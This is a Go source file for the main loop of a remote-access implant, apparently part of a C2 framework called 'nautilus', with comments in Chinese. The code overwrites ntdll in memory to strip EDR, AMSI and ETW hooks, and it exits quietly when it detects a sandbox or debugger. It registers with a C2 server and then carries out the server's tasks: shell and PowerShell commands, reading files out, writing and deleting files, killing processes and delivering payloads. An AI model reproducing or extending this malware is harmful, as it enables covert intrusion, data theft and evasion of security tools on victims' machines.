package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"nautilus/c2/encode"
	"nautilus/c2/transport"
	"nautilus/core"
	"nautilus/evasion"
)

var (
	c2Addr      string
	intervalStr string
	jitterStr   string
	sessionID   string // 注册后存储的sessionID
	skipSandbox string // 编译时注入: "1"跳过反沙箱 (调试用)
)

func main() {
	// NTDLL Unhooking — 移除EDR Hook (替代签名化的AMSI patch)
	// 从磁盘加载干净ntdll覆盖内存中的.text段
	// 一次性清除AMSI+ETW+所有Nt* Hook
	evasion.NtdllUnhook()

	// 反沙箱 (调试模式可跳过)
	if skipSandbox != "1" {
		if evasion.AntiSandbox() {
			os.Exit(0)
		}
	}

	// 反调试
	if evasion.AntiDebug() {
		// 静默退出
		os.Exit(0)
	}

	var interval, jitter int
	if intervalStr != "" {
		fmt.Sscanf(intervalStr, "%d", &interval)
	}
	if jitterStr != "" {
		fmt.Sscanf(jitterStr, "%d", &jitter)
	}

	cfg := transport.DefaultConfig(c2Addr)
	if interval > 0 {
		cfg.Interval = interval
	}
	if jitter > 0 {
		cfg.Jitter = jitter
	}

	tp := transport.NewHTTPTransport(cfg)

	// 注册上线 (带重试)
	for i := 0; i < 3; i++ {
		err := initSession(tp)
		if err == nil {
			break
		}
		time.Sleep(tp.GetInterval())
	}

	// 主循环: 轮询C2获取任务
	for {
		pkt, err := tp.Poll(sessionID)
		if err != nil {
			time.Sleep(tp.GetInterval())
			continue
		}

		if pkt.Type == encode.MsgTask {
			result := procReq(pkt)
			respPkt := &encode.Packet{
				Type:   encode.MsgTaskResult,
				TaskID: pkt.TaskID,
				Data:   result,
			}
			_, err := tp.Send(respPkt, sessionID)
			if err != nil {
				time.Sleep(tp.GetInterval())
				continue
			}
		}

		time.Sleep(tp.GetInterval())
	}
}

// initSession 上线注册
func initSession(tp *transport.HTTPTransport) error {
	info := core.GetSysInfo()
	infoJSON, _ := json.Marshal(info)
	pkt := &encode.Packet{
		Type: encode.MsgRegister,
		Data: infoJSON,
	}
	respPkt, err := tp.Send(pkt, "")
	if err != nil {
		return err
	}

	// 从响应中提取sessionID
	if respPkt.Type == encode.MsgRegister {
		var resp map[string]string
		json.Unmarshal(respPkt.Data, &resp)
		if sid, ok := resp["session_id"]; ok {
			sessionID = sid
		}
	}
	return nil
}

// procReq 处理下发的任务
func procReq(pkt *encode.Packet) []byte {
	req, err := encode.DecodeTaskReq(pkt.Data)
	if err != nil {
		resp := &encode.TaskResp{
			TaskID:  pkt.TaskID,
			Success: false,
			Error:   fmt.Sprintf("decode task failed: %v", err),
		}
		data, _ := encode.EncodeTaskResp(resp)
		return data
	}

	resp := &encode.TaskResp{
		TaskID: pkt.TaskID,
	}

	switch req.TaskType {
	case encode.TaskExecCmd:
		output, err := core.ExecCmdWithShell(req.Params["command"])
		resp.Output = output
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskExecPS:
		output, err := core.ExecCmdWithPowerShell(req.Params["command"])
		resp.Output = output
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskFileRead:
		data, err := core.FileRead(req.Params["path"])
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = evasion.B64Encode(data)
		}

	case encode.TaskFileWrite:
		data, err := evasion.B64Decode(req.Params["data"])
		if err != nil {
			resp.Success = false
			resp.Error = err.Error()
		} else {
			err = core.FileWrite(req.Params["path"], data)
			resp.Success = err == nil
			if err != nil {
				resp.Error = err.Error()
			}
		}

	case encode.TaskFileDelete:
		err := core.FileRemove(req.Params["path"])
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskListDir:
		files, err := core.ListDir(req.Params["path"])
		resp.Success = err == nil
		resp.Output = strings.Join(files, "\n")
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskProcList:
		procs, err := core.ProcessList()
		resp.Success = err == nil
		resp.Output = strings.Join(procs, "\n")
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskProcKill:
		pid := 0
		fmt.Sscanf(req.Params["pid"], "%d", &pid)
		err := core.ProcessKill(pid)
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskPrivInfo:
		info := core.GetPrivilegeInfo()
		resp.Success = true
		resp.Output = core.FormatPrivilegeInfo(info)

	case encode.TaskPayload:
		resp.Output = handlePayload(req.Params)

	case encode.TaskSysInfo:
		info := core.GetSysInfo()
		resp.Success = true
		resp.Output = core.FormatSysInfo(info)

	case encode.TaskExit:
		os.Exit(0)

	default:
		resp.Success = false
		resp.Error = fmt.Sprintf("unknown task type: %d", req.TaskType)
	}

	data, _ := encode.EncodeTaskResp(resp)
	return data
}
